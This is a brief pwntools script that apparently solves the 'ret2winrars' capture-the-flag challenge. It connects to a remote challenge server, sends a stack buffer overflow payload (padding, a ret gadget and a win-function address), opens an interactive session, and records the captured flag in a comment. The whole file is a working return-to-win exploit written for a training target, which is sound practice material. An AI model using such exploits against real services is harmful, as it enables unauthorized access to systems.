from pwn import *

p = remote('193.57.159.27','41299')
#p = process('./ret2winrars')

payload = b'A'*0x28+p64(0x401016)+p64(0x401162)
p.sendline(payload)
p.interactive()
#rarctf{0h_1_g3t5_1t_1t5_l1k3_ret2win_but_w1nr4r5_df67123a66}